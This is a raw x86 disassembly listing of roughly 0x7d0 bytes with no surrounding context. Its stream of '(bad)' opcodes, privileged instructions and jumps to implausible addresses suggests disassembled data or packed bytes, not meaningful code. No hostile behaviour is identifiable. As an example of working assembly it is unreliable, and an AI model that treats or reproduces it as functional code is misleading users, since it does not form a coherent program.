  407bc4:	js     0x407c07
  407bc6:	jnp    0x407b77
  407bc8:	sbb    eax,0xb977824e
  407bcd:	pop    ebx
  407bce:	int3   
  407bcf:	fsubr  DWORD PTR [ebp-0x2]
  407bd2:	jo     0x407c36
  407bd4:	pavgw  mm6,QWORD PTR [edx]
  407bd7:	xchg   esp,eax
  407bd8:	ret    0x35b9
  407bdb:	popf   
  407bdc:	leave  
  407bdd:	sbb    esi,DWORD PTR [edi]
  407bdf:	mov    WORD PTR [eax-0x7e],fs
  407be2:	mov    bh,BYTE PTR [ebp-0x7a]
  407be5:	test   eax,0xc4332958
  407bea:	xchg   esi,eax
  407beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bec:	or     BYTE PTR [edx],0xe
  407bef:	jp     0x407c6d
  407bf1:	adc    DWORD PTR [edx-0x1f],eax
  407bf4:	xlat   BYTE PTR ds:[ebx]
  407bf5:	arpl   WORD PTR [esi],bp
  407bf7:	push   ebp
  407bf8:	mul    DWORD PTR [edx+0x4447f6b]
  407bfe:	lods   eax,DWORD PTR ds:[esi]
  407bff:	add    BYTE PTR [eax+eax*4],bl
  407c02:	scas   eax,DWORD PTR es:[edi]
  407c03:	and    al,0xa6
  407c05:	lahf   
  407c06:	js     0x407c48
  407c08:	adc    eax,0x63b91cc1
  407c0d:	dec    esi
  407c0e:	cmp    BYTE PTR [edx-0x18761595],0x37
  407c15:	sar    DWORD PTR [ebp+edx*4+0x2b95d13f],0x7c
  407c1d:	adc    BYTE PTR [edi+edx*8-0x2a],al
  407c21:	fsub   st,st(0)
  407c23:	sub    eax,0xab730f7a
  407c28:	or     al,0xd7
  407c2a:	int3   
  407c2b:	or     ah,BYTE PTR [edx-0x3a]
  407c2e:	sti    
  407c2f:	pop    eax
  407c30:	sbb    BYTE PTR [ebp+ebx*8-0x43],dh
  407c34:	test   eax,0x48ce5127
  407c39:	mov    ah,0xb4
  407c3b:	ret    
  407c3c:	dec    esi
  407c3d:	jno    0x407bc9
  407c3f:	call   0xfc76131f
  407c44:	sub    ebx,ebp
  407c46:	push   edi
  407c47:	loope  0x407bd8
  407c49:	push   0x45
  407c4b:	clc    
  407c4c:	xor    bh,BYTE PTR [eax-0xc8f4c53]
  407c52:	jno    0x407be0
  407c54:	push   edi
  407c55:	push   es
  407c56:	stos   DWORD PTR es:[edi],eax
  407c57:	jg     0x407c1a
  407c59:	mov    dh,0xc5
  407c5b:	daa    
  407c5c:	aas    
  407c5d:	add    ch,BYTE PTR [esi]
  407c5f:	in     eax,0x2d
  407c61:	out    0xc0,eax
  407c63:	jl     0x407cb6
  407c65:	and    BYTE PTR [edi],al
  407c67:	add    DWORD PTR [ebp-0x2f2fabeb],edx
  407c6d:	shr    DWORD PTR [edx+0x6cba86e3],0x5d
  407c74:	inc    esp
  407c75:	add    DWORD PTR [ecx+edi*8+0x2dea0c71],ebx
  407c7c:	mov    eax,0x2860de73
  407c81:	mov    ch,0xa4
  407c83:	pop    eax
  407c84:	je     0x407c47
  407c86:	mov    eax,0x7060eea2
  407c8b:	jmp    0x8e1fc1b5
  407c90:	fstp   QWORD PTR [ebx-0x531fcc2c]
  407c96:	cwde   
  407c97:	pop    ebx
  407c98:	push   esi
  407c99:	or     dl,cl
  407c9b:	or     eax,0x27bd0e25
  407ca0:	mov    ebp,0x970e5047
  407ca5:	ficomp DWORD PTR ds:0x2b206305
  407cab:	jg     0x407ca2
  407cad:	jno    0x407cb3
  407caf:	gs out dx,eax
  407cb1:	add    dh,BYTE PTR [ebp+0x196124a1]
  407cb7:	mov    bh,0x67
  407cb9:	xor    bl,dl
  407cbb:	data16 test al,0x9f
  407cbe:	dec    esp
  407cbf:	xor    eax,ebx
  407cc1:	(bad)  
  407cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cc3:	lods   al,BYTE PTR ds:[esi]
  407cc4:	in     al,0x21
  407cc6:	les    ecx,FWORD PTR ds:[ebp+0x54917c6e]
  407ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cce:	clc    
  407ccf:	fs aam 0x65
  407cd2:	push   ebx
  407cd3:	je     0x407ccb
  407cd5:	add    ebx,DWORD PTR [eax+0x13]
  407cd8:	stos   BYTE PTR es:[edi],al
  407cd9:	jmp    0xc9901147
  407cde:	subps  xmm5,XMMWORD PTR [edi-0x73]
  407ce2:	mov    bh,0xf8
  407ce4:	sub    al,0xa0
  407ce6:	std    
  407ce7:	adc    al,0x86
  407ce9:	xor    eax,esi
  407ceb:	fisubr DWORD PTR [ebp+0x42e78b49]
  407cf1:	mov    al,ds:0xfd9091f8
  407cf6:	cmp    ebp,0x2dfdc434
  407cfc:	das    
  407cfd:	adc    bh,ch
  407cff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d00:	mov    al,ds:0x3e03d061
  407d05:	jp     0x407cdb
  407d07:	inc    esp
  407d08:	mov    ecx,0x48b18497
  407d0d:	add    BYTE PTR [eax-0x3064009],ch
  407d13:	out    0x17,al
  407d15:	inc    esp
  407d16:	jp     0x407d91
  407d18:	inc    ecx
  407d19:	add    ecx,DWORD PTR [edx+0x4bd07a52]
  407d1f:	repnz mov ecx,DWORD PTR es:[edi]
  407d23:	iret   
  407d24:	retf   
  407d25:	adc    eax,DWORD PTR [edx+0x42]
  407d28:	mov    dl,BYTE PTR [ebp-0x5d]
  407d2b:	add    ebx,0x5a
  407d2e:	mov    esi,0x2eae553d
  407d33:	test   DWORD PTR [edi],esi
  407d35:	icebp  
  407d36:	out    0x50,al
  407d38:	and    ebp,esp
  407d3a:	push   ds
  407d3b:	xchg   ecx,eax
  407d3c:	cmp    DWORD PTR [edi-0x72f6f3ff],eax
  407d42:	jecxz  0x407d4f
  407d44:	scas   eax,DWORD PTR es:[edi]
  407d45:	dec    eax
  407d46:	or     ch,al
  407d48:	pop    edx
  407d49:	into   
  407d4a:	xsavec [edi+0x7a45aaa2]
  407d51:	call   0xe34dde9f
  407d56:	arpl   bp,si
  407d58:	pusha  
  407d59:	ret    
  407d5a:	popa   
  407d5b:	mov    al,0x7e
  407d5d:	leave  
  407d5e:	fadd   DWORD PTR [ebx-0x692452f]
  407d64:	lahf   
  407d65:	xor    dl,BYTE PTR [edi]
  407d67:	adc    BYTE PTR [esp+ecx*8+0x5b212eab],cl
  407d6e:	cwde   
  407d6f:	cmp    al,0x9b
  407d71:	fsubr  QWORD PTR [ecx-0x56160b4b]
  407d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d78:	mov    ds:0x9712b085,eax
  407d7d:	adc    ecx,DWORD PTR ds:0x369e4a07
  407d83:	cmp    eax,0x8dbc9dad
  407d88:	mov    ecx,0x44aea559
  407d8d:	cmp    BYTE PTR [eax],dh
  407d8f:	idiv   BYTE PTR [esi]
  407d91:	mov    esp,0x3eb8ad73
  407d96:	stc    
  407d97:	jb     0x407dbb
  407d99:	cmc    
  407d9a:	addr16 in al,dx
  407d9c:	adc    DWORD PTR [eax],ebx
  407d9e:	fnstcw WORD PTR [ebx+0x5c0c279a]
  407da4:	out    0x56,eax
  407da6:	add    DWORD PTR cs:[edx+ebp*8+0x2f0f40d4],edi
  407dae:	jne    0x407e02
  407db0:	mov    esi,0x9c960051
  407db5:	mov    bh,0x17
  407db7:	inc    ecx
  407db8:	test   eax,0x79ae419c
  407dbd:	out    dx,eax
  407dbe:	sbb    ecx,DWORD PTR [ebp-0x53dcb58f]
  407dc4:	test   BYTE PTR [ebx],dl
  407dc6:	sti    
  407dc7:	xor    bh,BYTE PTR [ebp-0x146d19a1]
  407dcd:	xchg   ebx,eax
  407dce:	sbb    edi,0x0
  407dd1:	cli    
  407dd2:	fnstsw WORD PTR [ebx+0x7e284077]
  407dd8:	sbb    eax,0x71c143d5
  407ddd:	xchg   esi,eax
  407dde:	or     ecx,DWORD PTR [edx+0x6a]
  407de1:	cwde   
  407de2:	scas   eax,DWORD PTR es:[edi]
  407de3:	or     BYTE PTR [eax],al
  407de5:	sub    DWORD PTR [esi],esp
  407de7:	mov    al,ds:0xac8d8f30
  407dec:	cmp    eax,0x9b82e478
  407df1:	test   DWORD PTR [esi+0x46b823e2],ebp
  407df7:	imul   edx,DWORD PTR [edi-0x52],0x45
  407dfb:	(bad)  
  407dfc:	cmp    ecx,DWORD PTR [eax+edi*8-0x288205eb]
  407e03:	mov    bl,0xa1
  407e05:	push   es
  407e06:	jmp    0x407e7e
  407e08:	add    dh,BYTE PTR [eax+0x334b547]
  407e0e:	ds add al,0xaf
  407e11:	lods   eax,DWORD PTR ds:[esi]
  407e12:	adc    eax,0x2d8e61e9
  407e17:	les    eax,FWORD PTR [esi-0xcf7719a]
  407e1d:	cmp    eax,0x870f335a
  407e22:	(bad)
  407e26:	mov    ecx,0x3bb8bc6c
  407e2b:	and    al,0xf7
  407e2d:	aas    
  407e2e:	addr16 cmp ebp,esp
  407e31:	retf   
  407e32:	sti    
  407e33:	add    DWORD PTR [edx+0x7d],edi
  407e36:	icebp  
  407e37:	icebp  
  407e38:	lods   al,BYTE PTR ds:[esi]
  407e39:	je     0x407e3f
  407e3b:	cmp    DWORD PTR [ebp+0x7e],edi
  407e3e:	xchg   ebp,eax
  407e3f:	sub    bh,0x8b
  407e42:	sub    BYTE PTR [esi+0x429af55b],bl
  407e48:	xor    edi,DWORD PTR [esi+0x7a]
  407e4b:	add    eax,eax
  407e4d:	mov    bh,0x9c
  407e4f:	mov    edx,0xbb1c2b8
  407e54:	dec    ebp
  407e55:	out    0x17,al
  407e57:	jo     0x407df2
  407e59:	popa   
  407e5a:	(bad)  
  407e5b:	dec    eax
  407e5c:	xor    esi,0x1490025c
  407e62:	cdq    
  407e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e64:	mov    al,ds:0x86d89226
  407e69:	push   esi
  407e6a:	mov    dl,BYTE PTR [edi-0x51c6cf26]
  407e70:	jle    0x407e41
  407e72:	xchg   ebp,eax
  407e73:	std    
  407e74:	icebp  
  407e75:	retf   0x7ecb
  407e78:	mov    bh,0xf0
  407e7a:	stc    
  407e7b:	xchg   edx,eax
  407e7c:	jle    0x407e61
  407e7e:	fadd   DWORD PTR [edx]
  407e80:	mov    dl,0x9d
  407e82:	push   es
  407e83:	ja     0x407e64
  407e85:	nop
  407e86:	mov    ds:0xff28c8bd,eax
  407e8b:	test   ch,0x46
  407e8e:	mov    ecx,DWORD PTR [eax]
  407e90:	push   esi
  407e91:	(bad)  
  407e92:	sbb    esp,DWORD PTR [esi]
  407e94:	je     0x407e8d
  407e96:	xchg   ebp,eax
  407e97:	or     eax,0x2a44114d
  407e9c:	clc    
  407e9d:	ins    DWORD PTR es:[edi],dx
  407e9e:	xchg   edx,eax
  407e9f:	addr16 sbb al,0x30
  407ea2:	ret    
  407ea3:	ins    DWORD PTR es:[edi],dx
  407ea4:	jg     0x407ea5
  407ea6:	arpl   WORD PTR [edi+0x7e],si
  407ea9:	lds    ebp,FWORD PTR [esi-0x3c27b797]
  407eaf:	ret    
  407eb0:	(bad)  
  407eb2:	cmp    al,0x59
  407eb4:	pop    eax
  407eb5:	cld    
  407eb6:	jmp    0x407e4a
  407eb8:	and    eax,ebx
  407eba:	jo     0x407f39
  407ebc:	retf   0xb42c
  407ebf:	fs int3 
  407ec1:	or     al,0xf
  407ec3:	out    0x47,eax
  407ec5:	sbb    dl,BYTE PTR [eax+0x70]
  407ec8:	jg     0x407f09
  407eca:	add    ebp,DWORD PTR [ecx]
  407ecc:	pop    edx
  407ecd:	mov    ebx,0x1c36dcc1
  407ed2:	rcl    BYTE PTR [ebp-0x79],cl
  407ed5:	cmc    
  407ed6:	(bad)  
  407ed7:	xor    ebx,DWORD PTR [eax]
  407ed9:	jle    0x407eb0
  407edb:	inc    ecx
  407edc:	and    BYTE PTR [edi-0x1417eb4e],0x7
  407ee3:	lahf   
  407ee4:	xor    eax,DWORD PTR [eax+0x3b]
  407ee7:	bound  eax,QWORD PTR ds:0x26d3d8b4
  407eed:	lods   al,BYTE PTR ds:[esi]
  407eee:	hlt    
  407eef:	ss hlt 
  407ef1:	(bad)  
  407ef3:	jnp    0x407f19
  407ef5:	mov    al,ds:0x5cad266c
  407efa:	rcr    DWORD PTR [eax],cl
  407efc:	mov    ecx,0x80c29164
  407f01:	add    BYTE PTR [eax],cl
  407f03:	dec    esp
  407f04:	and    BYTE PTR [edi],dh
  407f06:	sbb    BYTE PTR [ebx+ecx*2-0x27],0x6e
  407f0b:	popf   
  407f0c:	in     al,0x16
  407f0e:	jb     0x407f79
  407f10:	xchg   edx,eax
  407f11:	and    al,0xad
  407f13:	stc    
  407f14:	inc    esp
  407f15:	data16 sbb ch,BYTE PTR [ebx+ebp*8]
  407f19:	call   0x2e93:0xe17db509
  407f20:	imul   edx,DWORD PTR ds:0xc386db1c,0x5275b536
  407f2a:	adc    ch,0x2a
  407f2d:	pop    es
  407f2e:	fiadd  DWORD PTR [eax-0x33]
  407f31:	into   
  407f32:	push   edx
  407f33:	sbb    DWORD PTR [ecx-0x6a0ffa2f],eax
  407f39:	hlt    
  407f3a:	jg     0x407f44
  407f3c:	ret    
  407f3d:	imul   ebx,DWORD PTR [edx-0x6280052],0x39
  407f44:	daa    
  407f45:	mov    edi,0x98ea7ed0
  407f4a:	sbb    BYTE PTR [edx-0x126a4aba],ah
  407f50:	rcl    al,0x5b
  407f53:	pop    edx
  407f54:	dec    ebx
  407f55:	sbb    dl,ch
  407f57:	fdiv   DWORD PTR [eax-0x3a86a266]
  407f5d:	rol    eax,1
  407f5f:	fbstp  TBYTE PTR ds:[esi]
  407f62:	and    al,0x10
  407f64:	jmp    0x777c3029
  407f69:	shl    DWORD PTR [edx],0x31
  407f6c:	imul   BYTE PTR [esp+edx*1+0x23cf8b25]
  407f73:	test   ecx,0xdfe88990
  407f79:	dec    edx
  407f7a:	jae    0x407f6f
  407f7c:	pop    ss
  407f7d:	call   0xdf77a59d
  407f82:	jae    0x407faa
  407f84:	xor    DWORD PTR [esp+ebx*8],esp
  407f87:	xor    al,0x5c
  407f89:	cmp    DWORD PTR [ebx],0x5f8de268
  407f8f:	into   
  407f90:	sbb    cl,BYTE PTR [ecx]
  407f92:	mov    ch,0xd2
  407f94:	or     cl,BYTE PTR [edx-0x5f19ea56]
  407f9a:	pop    eax
  407f9b:	mov    ebx,ebp
  407f9d:	enter  0x24bf,0xfb
  407fa1:	or     ebx,DWORD PTR [esi+0x4ebb8cf8]
  407fa7:	sbb    al,0x24
  407fa9:	cs call 0x24f8:0xe91867e8
  407fb1:	pop    edi
  407fb2:	fisubr DWORD PTR [bx+di]
  407fb5:	mov    eax,ds:0x19fee4a3
  407fba:	mov    dh,0x5d
  407fbc:	lds    esi,FWORD PTR [eax+0x17fe3551]
  407fc2:	call   0x485f81b7
  407fc7:	sbb    BYTE PTR [esp+ecx*8+0x197e59a6],0x3f
  407fcf:	in     eax,dx
  407fd0:	inc    edx
  407fd1:	sti    
  407fd2:	mov    eax,ds:0x5df99e2b
  407fd7:	scas   eax,DWORD PTR es:[edi]
  407fd8:	jno    0x407fb4
  407fda:	and    eax,0xd771476c
  407fdf:	xchg   esi,eax
  407fe0:	enter  0x1fca,0xff
  407fe4:	pushf  
  407fe5:	fwait
  407fe6:	xchg   esi,eax
  407fe7:	clc    
  407fe8:	and    BYTE PTR [ebx+0x39],0x41
  407fec:	lods   eax,DWORD PTR ds:[esi]
  407fed:	fsub   QWORD PTR [ebx+0x27]
  407ff0:	or     esp,DWORD PTR [ebp-0xe4ce09b]
  407ff6:	or     DWORD PTR [eax+esi*2+0x1],ebx
  407ffa:	adc    al,0xf6
  407ffc:	nop
  407ffd:	ins    BYTE PTR es:[edi],dx
  407ffe:	ficomp DWORD PTR [ebx+edx*2-0x676404f1]
  408005:	mov    ecx,0x2fd6ac4b
  40800a:	cmp    BYTE PTR [ebx-0x3671730f],ah
  408010:	jne    0x408070
  408012:	pop    ecx
  408013:	xchg   ebx,eax
  408014:	xchg   ebp,eax
  408015:	rcr    dl,cl
  408017:	mov    ebp,0x9925eca2
  40801c:	nop
  40801d:	xchg   esp,eax
  40801e:	sub    al,0x65
  408020:	int    0xe2
  408022:	mov    WORD PTR [eax+edi*1],es
  408025:	scas   al,BYTE PTR es:[edi]
  408026:	xor    DWORD PTR [ebx],edi
  408028:	fs pop edi
  40802a:	mov    esi,DWORD PTR ds:0x528f6c2
  408030:	push   0xd4e2b5f7
  408035:	xlat   BYTE PTR es:[ebx]
  408037:	(bad)  
  408038:	int    0xcb
  40803a:	push   esp
  40803b:	and    eax,0xb1f35afb
  408040:	call   0x9a8522c4
  408045:	xor    ebp,0x10
  408048:	out    dx,eax
  408049:	inc    esi
  40804a:	loop   0x407fd1
  40804c:	(bad)  
  40804d:	std    
  40804e:	push   0xffffff8b
  408050:	ss (bad) 
  408052:	mov    esi,0x898cf0c
  408057:	cmp    edi,DWORD PTR [esi+0x4e]
  40805a:	push   ecx
  40805b:	clc    
  40805c:	push   esp
  40805d:	in     eax,dx
  40805e:	out    0x3e,eax
  408060:	sub    BYTE PTR [ecx+0x51f82d81],cl
  408066:	jb     0x40800f
  408068:	push   esi
  408069:	inc    edi
  40806a:	sub    al,dh
  40806c:	add    eax,0x2ce4cbf2
  408071:	inc    edx
  408072:	jge    0x40806b
  408074:	pop    edi
  408075:	cli    
  408076:	mov    eax,0x89970913
  40807b:	push   ss
  40807c:	repz repz fwait
  40807f:	repnz mov eax,0x725b4c51
  408085:	pop    ebx
  408086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408087:	or     DWORD PTR [edi+0x5],esi
  40808a:	jecxz  0x408038
  40808c:	lods   al,BYTE PTR ds:[esi]
  40808d:	(bad)  
  40808e:	(bad)  [ebx-0x4893af28]
  408094:	xchg   ebx,eax
  408095:	pushf  
  408096:	add    edx,DWORD PTR [ecx+0x70]
  408099:	es (bad) 
  40809b:	sub    eax,0x757e9a24
  4080a0:	shr    DWORD PTR [edi],cl
  4080a2:	and    eax,0xffbaadec
  4080a7:	or     ah,cl
  4080a9:	and    eax,0x81c601b9
  4080ae:	sbb    DWORD PTR [edx+0x27],0xaa24f72d
  4080b5:	ds in  eax,dx
  4080b7:	inc    edi
  4080b8:	cli    
  4080b9:	loope  0x408077
  4080bb:	fisubr WORD PTR [edx-0x76]
  4080be:	jae    0x4080a4
  4080c0:	lds    ebx,FWORD PTR [esi]
  4080c2:	pop    ss
  4080c3:	frstor [esi+0x6d00d988]
  4080c9:	loopne 0x40806a
  4080cb:	cli    
  4080cc:	stos   DWORD PTR es:[edi],eax
  4080cd:	jno    0x40804f
  4080cf:	adc    al,0xb7
  4080d1:	add    ebp,esi
  4080d3:	ins    BYTE PTR es:[edi],dx
  4080d4:	fwait
  4080d5:	push   edi
  4080d6:	add    eax,0xb8669b6f
  4080db:	ins    DWORD PTR es:[edi],dx
  4080dc:	cmp    al,0x36
  4080de:	in     eax,0x8c
  4080e0:	repz pushf 
  4080e2:	add    eax,0x19a8113e
  4080e7:	push   esp
  4080e8:	jno    0x4080d0
  4080ea:	int    0x5e
  4080ec:	add    bl,BYTE PTR [edx+eiz*1-0x38]
  4080f0:	mov    eax,0x23a9363d
  4080f5:	cmp    ah,BYTE PTR ds:0xd3e3b454
  4080fb:	nop
  4080fc:	xor    DWORD PTR [ecx],ebx
  4080fe:	dec    esi
  4080ff:	xchg   bl,dl
  408101:	out    0xb7,eax
  408103:	mov    dl,0x5a
  408105:	cmp    DWORD PTR [ebx],0xffffffbe
  408108:	jg     0x4080ef
  40810a:	or     eax,0xf9f042f4
  40810f:	dec    esp
  408110:	ret    0x7c04
  408113:	or     ebx,DWORD PTR [ebx+0x4a]
  408116:	stos   BYTE PTR es:[edi],al
  408117:	cmp    DWORD PTR [ebp+0x6e82eee5],ebp
  40811d:	pop    ebx
  40811e:	inc    esi
  40811f:	jp     0x408160
  408121:	cmp    ecx,DWORD PTR [edi-0x1beb9fab]
  408127:	test   cl,0xaf
  40812a:	(bad)  
  40812b:	sbb    eax,0xc3b3f9b4
  408130:	inc    esp
  408131:	jae    0x4080f5
  408133:	nop
  408134:	ret    
  408135:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  408137:	mov    ds,WORD PTR [edx]
  408139:	sub    DWORD PTR [ebx-0x71],ebp
  40813c:	inc    ebx
  40813d:	pusha  
  40813e:	mov    ah,bl
  408140:	rcl    al,1
  408142:	div    BYTE PTR [edi+0x4197f8cc]
  408148:	pop    ss
  408149:	jbe    0x4081b4
  40814b:	(bad)  
  40814f:	pop    ecx
  408150:	out    0x71,al
  408152:	sub    al,0xed
  408154:	cmp    DWORD PTR [ebp+0x3a],esi
  408157:	in     eax,dx
  408158:	push   ecx
  408159:	push   cs
  40815a:	repz cwde 
  40815c:	scas   al,BYTE PTR es:[edi]
  40815d:	sub    dh,ch
  40815f:	shufps xmm5,XMMWORD PTR [ebx],0x3a
  408163:	cld    
  408164:	fs ja  0x408195
  408167:	adc    esi,DWORD PTR ds:0xb6c6e0ae
  40816d:	mov    WORD PTR [edi+0x44f52954],fs
  408173:	fs mov ecx,0x7a7de5f0
  408179:	xchg   esp,eax
  40817a:	sbb    eax,0xe7b878b8
  40817f:	or     DWORD PTR [ecx+0x261462b7],edi
  408185:	push   cs
  408186:	xchg   ecx,eax
  408187:	jmp    0x1c79:0x107f10ca
  40818e:	xor    al,0x4
  408190:	push   edi
  408191:	int3   
  408192:	inc    edx
  408193:	pop    eax
  408194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408195:	adc    ebp,esp
  408197:	xchg   DWORD PTR [ebx+0x79725495],edi
  40819d:	in     eax,dx
  40819e:	push   ds
  40819f:	(bad)  
  4081a0:	mov    ecx,0xd921f47f
  4081a5:	or     al,0x5e
  4081a7:	mov    ds:0x4dddc124,al
  4081ac:	sbb    edi,DWORD PTR [edx-0x3a]
  4081af:	das    
  4081b0:	mov    ebp,0x435c1989
  4081b5:	cdq    
  4081b6:	pushf  
  4081b7:	add    ebp,0xb7a72d99
  4081bd:	push   ss
  4081be:	ror    ecx,1
  4081c0:	jno    0x408227
  4081c2:	push   eax
  4081c3:	inc    edx
  4081c4:	cli    
  4081c5:	mov    ebp,0x6c37ba18
  4081ca:	ins    BYTE PTR es:[edi],dx
  4081cb:	mov    ecx,0xf9695e4c
  4081d0:	cwde   
  4081d1:	sub    al,0x11
  4081d3:	test   DWORD PTR [ebx+edi*4],ebp
  4081d6:	cmp    eax,0x75331422
  4081db:	sub    al,0x5a
  4081dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081de:	fiadd  WORD PTR [edx-0x75]
  4081e1:	inc    ecx
  4081e2:	inc    esi
  4081e3:	mov    edi,DWORD PTR [ecx+0x4a]
  4081e6:	jecxz  0x408204
  4081e8:	xchg   ebp,eax
  4081e9:	dec    edi
  4081ea:	mov    ebp,0xa833f71b
  4081ef:	scas   eax,DWORD PTR es:[edi]
  4081f0:	add    dl,BYTE PTR [edi+0x5dc1abbb]
  4081f6:	icebp  
  4081f7:	jmp    0x7d2bac69
  4081fc:	cmp    eax,0x27db75a5
  408201:	shr    BYTE PTR [eax],0x7a
  408204:	loop   0x40820e
  408206:	sbb    esi,ebx
  408208:	loopne 0x408274
  40820a:	imul   DWORD PTR cs:[ebx]
  40820d:	in     eax,dx
  40820e:	add    DWORD PTR [edx],ebp
  408210:	cdq    
  408211:	cld    
  408212:	xchg   esi,eax
  408213:	daa    
  408214:	into   
  408215:	sbb    eax,DWORD PTR [esi+0xb]
  408218:	jo     0x40824e
  40821a:	lds    ebx,FWORD PTR [ecx+edx*1]
  40821d:	pop    esp
  40821e:	repz fs xchg esp,eax
  408221:	sbb    dl,BYTE PTR [edx+ebx*8+0x56]
  408225:	sti    
  408226:	adc    edi,DWORD PTR [edx]
  408228:	cmp    ch,BYTE PTR [ebp-0x325c0b63]
  40822e:	in     eax,dx
  40822f:	mov    ebp,DWORD PTR [ebx]
  408231:	out    0x6,eax
  408233:	lock and ebx,DWORD PTR [ebx]
  408236:	mov    BYTE PTR [edx-0x7b79ca0d],ah
  40823c:	jge    0x408230
  40823e:	or     eax,0x6ed8a705
  408243:	(bad)  
  408244:	pop    edx
  408245:	frndint 
  408247:	sysenter 
  408249:	icebp  
  40824a:	jle    0x40828b
  40824c:	push   ebx
  40824d:	mov    ebp,0x74edfca1
  408252:	add    esi,DWORD PTR [edi+0x7e]
  408255:	adc    eax,0x8407d3bc
  40825a:	or     bh,BYTE PTR [eax+eiz*2+0x36]
  40825e:	pop    ebx
  40825f:	scas   eax,DWORD PTR es:[edi]
  408260:	pop    edi
  408261:	mov    bh,0x4e
  408263:	pop    edx
  408264:	or     BYTE PTR [edx],dl
  408266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408267:	ret    
  408268:	push   ecx
  408269:	push   edi
  40826a:	cs repz loopne 0x408298
  40826e:	cwde   
  40826f:	in     al,0xde
  408271:	pop    ds
  408272:	lahf   
  408273:	and    DWORD PTR [edi-0x2],edx
  408276:	lods   eax,DWORD PTR ds:[esi]
  408277:	mov    ebp,0xffd531e0
  40827c:	push   esi
  40827d:	jnp    0x40822f
  40827f:	xchg   edi,eax
  408280:	pop    esp
  408281:	(bad)  
  408282:	rsm    
  408284:	and    ch,dl
  408286:	test   eax,0x7c7ddb9
  40828b:	inc    ebx
  40828c:	int    0x4f
  40828e:	pop    esp
  40828f:	add    BYTE PTR [edx-0xe95df87],cl
  408295:	jp     0x4082e0
  408297:	sar    DWORD PTR [esi],0x42
  40829a:	pop    es
  40829b:	(bad)  
  40829c:	pop    esp
  40829d:	stc    
  40829e:	lahf   
  40829f:	rol    WORD PTR [edx-0x88bf928],1
  4082a6:	mov    dh,0x73
  4082a8:	mov    WORD PTR [edi],gs
  4082aa:	mov    DWORD PTR [ebx+0x7f],esi
  4082ad:	loope  0x408284
  4082af:	dec    esp
  4082b0:	std    
  4082b1:	pop    edi
  4082b2:	sbb    BYTE PTR [esi+edi*2],dh
  4082b5:	xchg   ecx,eax
  4082b6:	jne    0x4082fa
  4082b8:	sbb    eax,0x10615bd0
  4082bd:	dec    ebp
  4082be:	push   edx
  4082bf:	mov    bl,0xb7
  4082c1:	nop
  4082c2:	xor    ebx,DWORD PTR [edi-0x5de2a178]
  4082c8:	mov    ecx,0xecf05892
  4082cd:	(bad)  
  4082ce:	mov    DWORD PTR [esi-0x54],ebx
  4082d1:	aaa    
  4082d2:	or     eax,0x52151bf3
  4082d7:	xor    al,0xcc
  4082d9:	std    
  4082da:	mov    eax,0xa23807
  4082df:	loope  0x40831c
  4082e1:	test   al,0xc8
  4082e3:	push   esp
  4082e4:	push   esi
  4082e5:	aas    
  4082e6:	mov    edx,0x3d8b3fb7
  4082eb:	cwde   
  4082ec:	aas    
  4082ed:	jp     0x408301
  4082ef:	rol    dl,cl
  4082f1:	ror    DWORD PTR [eax+0x4a],0x97
  4082f5:	fidiv  WORD PTR [ebx+0x1d4441d2]
  4082fb:	jl     0x408360
  4082fd:	mov    ah,0x2b
  4082ff:	sub    DWORD PTR [eax],edi
  408301:	outs   dx,BYTE PTR ds:[esi]
  408302:	push   es
  408303:	test   eax,0x234059c8
  408308:	mov    dl,0x28
  40830a:	mov    cl,0x6
  40830c:	int3   
  40830d:	dec    esp
  40830e:	sar    BYTE PTR [esi-0x74],0xa6
  408312:	add    BYTE PTR [esi-0x64],bh
  408315:	add    cl,BYTE PTR [ebx-0x6a]
  408318:	pushf  
  408319:	stc    
  40831a:	dec    edx
  40831b:	shl    DWORD PTR [ecx+0x54],1
  40831e:	mov    ?,WORD PTR [edx+ebx*1]
  408321:	mov    DWORD PTR [ecx-0x303d8b4c],ecx
  408327:	lods   eax,DWORD PTR ds:[esi]
  408328:	push   es
  408329:	inc    eax
  40832a:	sub    DWORD PTR [eax],edi
  40832c:	scas   al,BYTE PTR es:[edi]
  40832d:	xchg   DWORD PTR [esi-0x6],ecx
  408330:	(bad)  [edx]
  408332:	inc    esp
  408333:	inc    edi
  408334:	fimul  WORD PTR [edx+0xada81f]
  40833a:	cs jae 0x408318
  40833d:	inc    ecx
  40833e:	mov    dh,0xb3
  408340:	shr    bh,1
  408342:	out    dx,al
  408343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408344:	cld    
  408345:	clc    
  408346:	stc    
  408347:	jno    0x408305
  408349:	adc    edx,DWORD PTR [edx-0x58b77200]
  40834f:	cmp    eax,0x2d2a26de
  408354:	into   
  408355:	lods   al,BYTE PTR ds:[esi]
  408356:	shl    DWORD PTR [esi],cl
  408358:	jp     0x4082eb
  40835a:	jp     0x408335
  40835c:	cmc    
  40835d:	leave  
  40835e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40835f:	push   es
  408360:	aas    
  408361:	(bad)  
  408362:	and    BYTE PTR [ebx],ah
  408364:	dec    eax
  408365:	stos   DWORD PTR es:[edi],eax
  408366:	xor    al,0x57
  408368:	jbe    0x408339
  40836a:	mov    al,ds:0xd9896fb7
  40836f:	push   ss
  408370:	pusha  
  408371:	fcmovb st,st(3)
  408373:	ins    BYTE PTR es:[edi],dx
  408374:	inc    ecx
  408375:	idiv   BYTE PTR ds:0x73b67532
  40837b:	and    al,0x39
  40837d:	(bad)  
  40837e:	jge    0x408330
  408380:	enter  0x40fa,0x12
  408384:	aam    0x62
  408386:	sub    DWORD PTR [edi-0x3c],ecx
  408389:	fldenv [esi-0x13]
  40838c:	pop    edx
  40838d:	adc    bh,BYTE PTR es:[edi+eax*4]
  408391:	adc    ah,BYTE PTR [edi+eax*8+0x3e]
  408395:	inc    ecx
  408396:	scas   eax,DWORD PTR es:[edi]
  408397:	mov    bh,0xfe
